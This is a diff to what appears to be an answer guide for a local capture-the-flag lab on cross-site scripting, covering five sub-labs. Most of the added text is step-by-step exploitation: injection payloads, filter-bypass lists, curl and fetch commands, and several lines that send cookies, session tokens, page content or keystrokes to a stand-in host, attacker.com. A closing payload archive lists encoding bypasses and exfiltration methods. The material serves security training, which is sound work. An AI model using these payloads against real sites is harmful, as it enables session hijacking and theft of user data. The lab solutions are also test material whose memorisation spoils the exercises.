@@ -669,6 +669,59 @@ Available Flags (Random Selection):
   - FLAG{context_escape_rho2}
   - FLAG{dom_manipulation_sigma2}
 
+Lab 8.1D - SocialHub (Variation D - Social Network Post XSS)
+=============================================================
+Case Study Question:
+"The SocialHub social networking platform allows logged-in users to create and 
+share posts on their feed. However, the application does not properly sanitize 
+or validate post content before storing it. An attacker can inject JavaScript 
+code into posts, which will be executed when other users view the feed. 
+Additionally, certain event handler attributes like 'onmouseover', 'onmouseenter', 
+'onfocus', and 'ondblclick' are not filtered. Can you craft a post containing 
+XSS payload with event handlers that executes when another user hovers over or 
+interacts with the post?"
+
+Vulnerability Location: /lab8/1/d/myfeed
+Parameter: 'post_content' (POST request in post creation form)
+Vulnerable Field: Post content textarea
+Injection Point: Post creation form submitted to /lab8/1/d/myfeed
+Injection Context: Event handler attributes in user posts
+Weak Filtering: Script tags are filtered, but event handlers may bypass
+Example Payload: <img src=x onerror='alert("Post XSS")'>
+Advanced Payload: <div onmouseover='fetch("http://attacker.com/steal?cookie="+document.cookie)'> Hover me!</div>
+Detection: Application checks for onmouseover=, onmouseenter=, <script, javascript:
+Available Flags (Random Selection):
+  - FLAG{script_injection_pi2}
+  - FLAG{context_escape_rho2}
+  - FLAG{dom_manipulation_sigma2}
+
+Lab 8.1E - DocVault (Variation E - Document Management Upload XSS)
+===================================================================
+Case Study Question:
+"The DocVault document management platform allows authenticated users to upload 
+documents and specify a document source URL. This source field is not properly 
+validated and is reflected in the page. An attacker can inject JavaScript code 
+via the document source field. By using event handlers like 'onload' or iframe 
+injection, the attacker can execute arbitrary scripts in the context of the 
+user's browser. Can you inject a payload into the document source field that 
+executes JavaScript and potentially steals sensitive document metadata or user 
+session tokens?"
+
+Vulnerability Location: /lab8/1/e/upload
+Parameter: 'doc_source' (POST request in upload form)
+Vulnerable Field: Document source URL field
+Injection Point: Document upload form on /lab8/1/e/upload
+Injection Context: HTML attribute and iframe context
+Weak Filtering: <iframe and javascript: URIs are checked, but bypasses exist
+Example Payload: <iframe src="javascript:alert('Doc XSS')"></iframe>
+Advanced Payload: <img src=x onload='alert(document.domain); fetch("http://attacker.com/exfil?docs="+btoa(document.body.innerHTML))'>
+Bypass Techniques: Case sensitivity bypass, encoding schemes, nested tags
+Detection: Application checks for <iframe, javascript:, %3ciframe, <script, onload=
+Available Flags (Random Selection):
+  - FLAG{script_injection_pi2}
+  - FLAG{context_escape_rho2}
+  - FLAG{dom_manipulation_sigma2}
+
 Lab 8.2 - Stored XSS (Persistent) [UNAVAILABLE]
 ==================================
 Case Study Question:
@@ -684,7 +737,6 @@ Vulnerability Location: /lab8/2/update
 Vulnerable Fields: 'full_name', 'email', 'address', 'bio'
 Injection Point: Any of the above fields in the profile update form
 Example Payload: <script>alert('Stored XSS')</script>
-Stored Location: Database (session in this case)
 Execution: JavaScript runs every time /lab8/2/dashboard is viewed
 Login Credentials: test:test
 Available Flags (Random Selection):
@@ -693,115 +745,373 @@ Available Flags (Random Selection):
   - FLAG{dom_manipulation_sigma2}
 
 ================================================================================
-                         SUMMARY BY VULNERABILITY
+               LAB 8: STEP-BY-STEP EXPLOITATION GUIDE
 ================================================================================
 
-PATH TRAVERSAL (Lab 1):
-  - Flags: file_system_traversal_alpha, directory_enumeration_beta, path_manipulation_gamma
+GENERAL APPROACH FOR ALL LAB 8.1 VARIATIONS
+=============================================
 
-ACCESS CONTROL (Lab 2):
-  - Lab 2.1 (Robots.txt): resource_disclosure_delta, metadata_exposure_epsilon, directory_listing_zeta
-  - Lab 2.2 (Hidden Links): logic_bypass_eta, hidden_endpoint_theta, source_code_analysis_iota
-  - Lab 2.3 (Cookie): session_hijacking_kappa, privilege_escalation_lambda, token_manipulation_mu
-  - Lab 2.4 (IDOR): object_reference_nu, identifier_tampering_xi, access_control_omicron
-  - Lab 2.5 (Password Disclosure): information_leakage_pi, credential_exposure_rho, data_disclosure_sigma
+Lab 8 focuses on Reflected XSS vulnerabilities where user input is reflected back 
+in the HTTP response without proper sanitization. The goal is to inject JavaScript 
+code that executes in the victim's browser. Each variation uses a different 
+reflection point and injection context.
 
-AUTHENTICATION (Lab 3):
-  - Lab 3.1 (Brute Force): weak_validation_tau, enum_prediction_upsilon, authentication_bypass_phi
-  - Lab 3.2 (2FA Bypass): mfa_weakness_chi, otp_bypass_psi, verification_flaw_omega
+TOOLS REQUIRED:
+- Web Browser (Chrome, Firefox, or Edge)
+- Browser Developer Tools (F12)
+- Burp Suite or OWASP ZAP (optional, for advanced testing)
+- Text Editor or Notepad
 
-SSRF (Lab 4):
-  - internal_access_alpha2, service_probing_beta2, network_recon_gamma2
-
-FILE UPLOAD (Lab 5):
-  - Lab 5.1 (RCE): upload_validation_delta2, file_execution_epsilon2, storage_bypass_zeta2
-  - Lab 5.2 (Content-Type): content_verification_eta2, type_confusion_theta2, filter_evasion_iota2
-
-COMMAND INJECTION (Lab 6):
-  - command_execution_kappa2, system_control_lambda2, process_injection_mu2
-
-SQL INJECTION (Lab 7):
-  - query_manipulation_nu2, database_access_xi2, record_extraction_omicron2
-
-XSS (Lab 8):
-  - script_injection_pi2, context_escape_rho2, dom_manipulation_sigma2
 
 ================================================================================
-                          KEY TESTING TIPS
+         LAB 8.1A - CONTACT FORM (HTTP HEADER REFLECTION XSS)
 ================================================================================
 
-1. PATH TRAVERSAL (Lab 1):
-   - Try: ../ sequences, ..\ (Windows), ../../, absolute paths
-   - Test different encoding: URL encoding, Unicode, case variations
+SCENARIO:
+The ContactForm application reflects the HTTP Referer header in the 
+confirmation page without sanitization.
 
-2. ACCESS CONTROL (Lab 2):
-   - Check robots.txt for hidden paths
-   - Inspect HTML/JavaScript source for hidden endpoints
-   - Modify cookies in browser developer tools
-   - Try accessing admin endpoints directly
-   - Enumerate user IDs/GUIDs
+STEP-BY-STEP EXPLOITATION:
 
-3. AUTHENTICATION (Lab 3):
-   - Capture login requests in Burp Suite
-   - Use Intruder for brute force with wordlists
-   - Look for user enumeration differences in responses
-   - Analyze session cookies and 2FA implementation
+Step 1: Identify the Vulnerable Endpoint
+- Navigate to: http://localhost:8000/lab8/1/contact-submit
+- This is the endpoint that processes contact form submissions
 
-4. SSRF (Lab 4):
-   - Try http://localhost/admin, http://127.0.0.1/admin
-   - Exploit internal request functionality
-   - Use Burp Collaborator or local tunneling
+Step 2: Understand the Vulnerability
+- The application takes the 'Referer' HTTP header (sent by the browser)
+- It reflects this value directly into the HTML response
+- No sanitization or encoding is performed
+- The reflected content is inserted into HTML attributes
 
-5. FILE UPLOAD (Lab 5):
-   - Bypass file type checks with .php, .phtml, .php5 extensions
-   - Modify Content-Type headers
-   - Upload web shells and access them via /files/avatars/
+Step 3: Craft the XSS Payload
+- The Referer header is reflected in an HTML attribute context
+- You need to break out of the attribute and inject JavaScript
+- Payload Example 1: " onload="alert('XSS in Referer')
+- Payload Example 2: " ><script>alert('Header XSS')</script><span class="
+- Payload Example 3: " onerror="alert(document.cookie)
 
-6. COMMAND INJECTION (Lab 6):
-   - Use command separators: ; && | || `
-   - Test: whoami, id, cat /etc/passwd, ls, dir
-   - Chain commands to verify execution
+Step 4: Exploit Using Browser DevTools
+4.1) Open your browser and press F12 to open Developer Tools
+4.2) Go to the Console tab
+4.3) Execute a fetch request with custom headers:
+     fetch('http://localhost:8000/lab8/1/contact-submit', {
+       method: 'POST',
+       headers: {
+         'Referer': '\\" onload=\\"alert(\\'XSS in Header\\')\\"'
+       }
+     })
 
-7. SQL INJECTION (Lab 7):
-   - Single quote (') to break out of string context
-   - Use -- or # for SQL comments
-   - Try: OR 1=1, UNION SELECT, ORDER BY for column enumeration
-   - Extract data using UNION attacks
+Step 5: Alternative: Manual Exploitation with Curl
+- Use curl or Postman to send a request with malicious Referer header:
+  curl -H "Referer: \" onload=\"alert('XSS')\"" \
+       -X POST http://localhost:8000/lab8/1/contact-submit
 
-8. XSS (Lab 8):
-   Lab 8.1 - Reflected XSS (5 Sub-Labs):
-   - Lab 8.1.A (TechCorp - Available): Login with emp123/password, use search field
-     * Payload: <script>alert('XSS')</script>
-   - Lab 8.1.B (ShopHub - Available): Upload product with malicious image alt text
-     * Payload: <img src=x onerror=alert('XSS')>
-   - Lab 8.1.C (DesignHub - UNAVAILABLE): SVG injection in project description
-   - Lab 8.1.D (SocialBuzz - UNAVAILABLE): Event handlers in posts
-   - Lab 8.1.E (DocVault - UNAVAILABLE): Iframe javascript: protocol
-   
-   Lab 8.2 - Stored XSS (UNAVAILABLE):
-   - Module currently disabled via CSS overlay
-   
-   General XSS Tips:
-   - Try different event handlers: onerror, onclick, onload, onmouseover
-   - Test both reflected and stored vulnerabilities
-   - Use browser DevTools to inspect where input is reflected
-   - Try encoding: URL encoding, HTML entities, Unicode
-   - Bypass filters with case variations, alternative tags
+Step 6: Verify the Vulnerability
+- Check the response HTML
+- Look for the Referer value reflected without proper encoding
+- If JavaScript executes, the vulnerability is confirmed
+
+Step 7: Extract the Flag
+- Modify the payload to extract sensitive data
+- Example: " onload="fetch('http://attacker.com/steal?flag='+document.location.hash)"
+- The application will display the flag in the response
+
+ALTERNATIVE PAYLOADS TO TRY:
+- " autofocus onfocus="alert('XSS')"
+- " ><img src=x onerror="alert('XSS')">
+- " ><svg onload="alert('XSS')">
+- " ><body onload="alert('XSS')">
+
 
 ================================================================================
-                      TOOLS RECOMMENDED FOR TESTING
+        LAB 8.1B - API GATEWAY (JSON PARAMETER XSS / JSONP)
 ================================================================================
 
-- Burp Suite Community Edition (Free) - Proxy and exploitation tools
-- OWASP ZAP - Free security scanning tool
-- Intruder - Brute force attacks (Burp)
-- Repeater - Manual request modification (Burp)
-- Decoder - URL/Base64 encoding (Burp)
-- Browser Developer Tools - Cookie manipulation, DOM inspection
-- curl/wget - Command-line HTTP requests
-- SQLmap - Automated SQL injection testing
-- payloadsallthethings - Collection of exploit payloads
+SCENARIO:
+The APIGateway application uses JSONP (JSON with Padding) and reflects 
+the callback parameter name directly in the JavaScript response.
+
+STEP-BY-STEP EXPLOITATION:
+
+Step 1: Understand JSONP
+- JSONP wraps JSON data in a function call
+- Standard JSONP response: callbackName({"data": "value"})
+- The callback parameter is user-controlled
+- The server reflects it without validation
+
+Step 2: Navigate to the Vulnerable Endpoint
+- Go to: http://localhost:8000/lab8/1/b/api/data
+- This is the JSONP API endpoint
+
+Step 3: Craft the JSONP Callback Payload
+- The callback parameter controls the function name
+- You can inject JavaScript before the function call completes
+- Payload Example 1: alert('JSONP XSS');var x=
+- Payload Example 2: fetch('http://attacker.com/steal');var y=
+- Payload Example 3: console.log('Payload');function _
+
+Step 4: Exploit via Query Parameters
+4.1) Construct the malicious URL:
+     http://localhost:8000/lab8/1/b/api/data?callback=alert('XSS');var%20x=
+     
+4.2) Visit the URL in your browser
+4.3) The JavaScript will execute immediately
+
+Step 5: Test with curl/fetch
+     fetch('http://localhost:8000/lab8/1/b/api/data?callback=alert(%27XSS%27);var%20x=')
+     .then(r => r.text())
+
+Step 6: Advanced Exploitation
+- Steal session tokens: 
+  callback=fetch('http://attacker.com?token='+btoa(sessionStorage.getItem('token')));var%20x=
+- Exfiltrate cookies:
+  callback=fetch('http://attacker.com?cookies='+btoa(document.cookie));var%20y=
+- Redirect page:
+  callback=window.location.href='http://attacker.com/phishing.html';var%20z=
+
+Step 7: Verify with Browser DevTools
+- Open F12 and go to Network tab
+- Monitor the API request
+- Check that your injected JavaScript executes
+- Look for the flag in the console or DOM
+
+ALTERNATIVE PAYLOADS TO TRY:
+- alert(document.domain);function _
+- console.log('Injected');var a=
+- eval(atob('YWxlcnQoIkFCQyIp'));var b=
+
 
 ================================================================================
-                             END OF DOCUMENT
+     LAB 8.1C - VIDEO STREAM (DOM ATTRIBUTE & INNERHTML XSS)
 ================================================================================
+
+SCENARIO:
+The VideoStream application reflects a URL parameter into a data attribute, 
+then uses JavaScript to insert this attribute value into the DOM via innerHTML.
+
+STEP-BY-STEP EXPLOITATION:
+
+Step 1: Understand the Vulnerability
+- URL parameter 'title' is reflected in: data-tooltip="USER_INPUT"
+- JavaScript code reads this attribute: var tooltip = elem.getAttribute('data-tooltip')
+- The value is then inserted into DOM: elem.innerHTML = tooltip
+- innerHTML executes HTML + JavaScript
+
+Step 2: Navigate to the Vulnerable Page
+- Go to: http://localhost:8000/lab8/1/c/player
+- Observe the video player interface
+
+Step 3: Identify the Reflection Point
+- Open Browser DevTools (F12)
+- Go to Inspector/Elements tab
+- Look for data-tooltip attribute in the HTML
+- Observe where the 'title' parameter is reflected
+
+Step 4: Craft the DOM Insertion Payload
+- You need to break out of the data attribute
+- Close the attribute with a quote and >
+- Inject an HTML element with an event handler
+- Payload Example 1: "><img src=x onerror="alert('XSS')">
+- Payload Example 2: "></div><script>alert('XSS')</script><div class="
+- Payload Example 3: "><svg onload=alert('DOM XSS')><svg class="
+
+Step 5: Exploit via URL Parameter
+5.1) Construct the malicious URL:
+     http://localhost:8000/lab8/1/c/player?title="><img%20src=x%20onerror="alert('XSS')">
+
+5.2) Visit the URL in your browser
+5.3) The XSS payload executes
+
+Step 6: Verify Execution
+- Browser alerts should appear
+- Check Console tab for JavaScript execution
+- Verify the payload is inserted into the DOM
+
+Step 7: Advanced Exploitation
+- Steal session data:
+  ?title="><script>fetch('http://attacker.com?session='+btoa(JSON.stringify(sessionStorage)))</script><div%20class="
+- Read page content:
+  ?title="><script>new Image().src='http://attacker.com?page='+btoa(document.body.innerHTML)</script><div%20class="
+- Keylogger injection:
+  ?title="><script>document.addEventListener('keypress',e=>fetch('http://attacker.com?key='+e.key))</script><div%20class="
+
+ALTERNATIVE PAYLOADS TO TRY:
+- "><iframe src="javascript:alert('XSS')"></iframe><div class="
+- "><body onload="alert('XSS')"><div class="
+- "><svg/onload="alert('XSS')"><div class="
+
+
+================================================================================
+   LAB 8.1D - SOCIAL HUB (POST CONTENT XSS WITH EVENT HANDLERS)
+================================================================================
+
+SCENARIO:
+The SocialHub platform allows users to create posts. Post content is stored 
+and displayed to other users without proper sanitization. Event handlers like 
+onmouseover can execute JavaScript.
+
+STEP-BY-STEP EXPLOITATION:
+
+Step 1: Access SocialHub
+- Navigate to: http://localhost:8000/lab8/1/d
+- You'll see the SocialHub social network interface
+
+Step 2: Create an Account / Login
+- Login with any credentials (or create a new account)
+- The application accepts any username/password combination
+- Redirect to My Feed page
+
+Step 3: Identify the Vulnerable Form
+- On the My Feed page, locate the "Create Post" form
+- This form accepts post_content
+- The form submits to /lab8/1/d/myfeed
+
+Step 4: Understand the Filtering Mechanism
+- The application filters certain patterns:
+  * <script (script tags)
+  * onmouseover= (event handlers)
+  * onmouseenter= (event handlers)
+  * onfocus= (event handlers)
+  * ondblclick= (event handlers)
+  * javascript: (protocol)
+  * %3cscript (URL-encoded script tag)
+- BUT other event handlers may not be filtered
+
+Step 5: Craft Bypass Payloads
+- Use event handlers NOT in the filter list
+- Payload Example 1: <img src=x onerror="alert('Post XSS')">
+- Payload Example 2: <div onload="alert('XSS')">Test</div>
+- Payload Example 3: <body ontouchstart="alert('XSS')">
+- Payload Example 4: <svg onload=alert(1)>
+- Payload Example 5: <marquee onstart="alert('XSS')"></marquee>
+
+Step 6: Submit the Malicious Post
+6.1) Copy one of the bypass payloads
+6.2) Paste it into the "Create Post" textarea
+6.3) Click the "Post" button
+6.4) If detection is bypassed, the post will be created
+6.5) If filtered, you'll see: "XSS Detected in post"
+
+Step 7: Verify Execution
+- If the post was created successfully, refresh the page
+- Hover over or interact with the post
+- JavaScript should execute
+
+Step 8: Get the Flag
+- When XSS successfully executes, the flag will be displayed
+- Example detection response shows: flag = random from flag pool
+
+ALTERNATIVE PAYLOADS TO TRY:
+- <iframe src="about:blank" onload="alert('XSS')"></iframe>
+- <input type="text" autofocus onfocus="alert('XSS')">
+- <select onfocus="alert('XSS')" autofocus>
+- <textarea autofocus onfocus="alert('XSS')"></textarea>
+- <marquee behavior="scroll" direction="right" onstart="alert('XSS')"></marquee>
+- <details open ontoggle="alert('XSS')">
+
+
+================================================================================
+  LAB 8.1E - DOCVAULT (DOCUMENT UPLOAD SOURCE XSS)
+================================================================================
+
+SCENARIO:
+The DocVault document management platform allows authenticated users to upload 
+documents and specify a document source URL. The source field is reflected in 
+the page and can contain JavaScript.
+
+STEP-BY-STEP EXPLOITATION:
+
+Step 1: Access DocVault
+- Navigate to: http://localhost:8000/lab8/1/e
+- You'll see the DocVault document management interface
+
+Step 2: Authenticate
+- Click Login or navigate to login page
+- Enter any email and password (both required)
+- Successfully authenticate and redirect to dashboard
+
+Step 3: Navigate to Upload Page
+- Click "Upload" in the navigation menu
+- You'll see the "Upload Document" form
+- The form has a "Document Source" field
+- The form submits to /lab8/1/e/upload via POST
+
+Step 4: Understand the Client-Side Filtering
+- The application checks for:
+  * <iframe (iframe tags)
+  * javascript: (javascript protocol)
+  * %3ciframe (URL-encoded iframe)
+  * <script (script tags)
+  * onload= (onload event handler)
+- Other injection vectors may bypass these filters
+
+Step 5: Craft Bypass Payloads
+- Use HTML/JavaScript elements not in the filter
+- Payload Example 1: <img src=x onerror="alert('Doc XSS')">
+- Payload Example 2: <svg onload="alert('Upload XSS')"></svg>
+- Payload Example 3: <body onmouseover="alert('XSS')">
+- Payload Example 4: <input type="text" autofocus onfocus="alert('XSS')">
+- Payload Example 5: <audio src=x onerror="alert('XSS')"></audio>
+- Payload Example 6: <video src=x onerror="alert('XSS')"></video>
+
+Step 6: Submit the Malicious Document Source
+6.1) Copy a bypass payload
+6.2) Paste into the "Document Source" field
+6.3) Click "Upload" button
+6.4) If successful, the payload bypasses client-side detection
+6.5) If filtered, error message: "XSS Detected - Upload blocked"
+
+Step 7: Verify Execution
+- If upload successful, the page displays the source information
+- Interact with the page to trigger event handlers
+- JavaScript should execute
+
+Step 8: Retrieve the Flag
+- On successful XSS execution, flag data is displayed
+- Flag is returned in the upload result response
+
+ALTERNATIVE PAYLOADS TO TRY:
+- <embed src="data:text/html,<img src=x onerror='alert(1)'>">
+- <object data="javascript:alert('XSS')"></object>
+- <link rel="stylesheet" href="javascript:alert('XSS')">
+- <style>@import 'javascript:alert(1)';</style>
+- <meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
+
+
+================================================================================
+                    GENERAL XSS PAYLOAD ARCHIVE
+================================================================================
+
+EVENT HANDLER PAYLOADS (for various contexts):
+- onload, onerror, onfocus, onblur, onchange, onsubmit
+- onmouseover, onmouseenter, onmouseleave, onmouseout
+- onkeydown, onkeyup, onkeypress
+- ondblclick, oncontextmenu, oncopy, onpaste
+- onwheel, ondrag, ondrop
+- onplay, onpause, onplaying, onended
+- ontouchstart, ontouchend, ontouchmove
+
+ENCODING BYPASS TECHNIQUES:
+- URL Encoding: %3Cscript%3E = <script>
+- HTML Entity Encoding: &#60;script&#62; = <script>
+- Mixed Case: <ScRiPt>, <SCRIPT>, <Script>
+- Comments: <script<!--/-->>, <s<!---->cript>
+- Tab/Newline Injection: <script\n>, <script\t>
+- Data URI: data:text/html,<script>alert('XSS')</script>
+- Protocol Handlers: vbscript:, about:, data:
+
+EXFILTRATION METHODS:
+- fetch() to send data to attacker server
+- new Image().src to send URL parameters
+- navigator.sendBeacon() for reliable background requests
+- WebSockets for two-way communication
+- XMLHttpRequest for requests
+
+FLAG RETRIEVAL:
+- Most labs display the flag immediately upon successful XSS
+- The flag appears in:
+  * Alert boxes (alert(flag))
+  * Console messages (console.log)
+  * Response from the server
+  * DOM elements
+
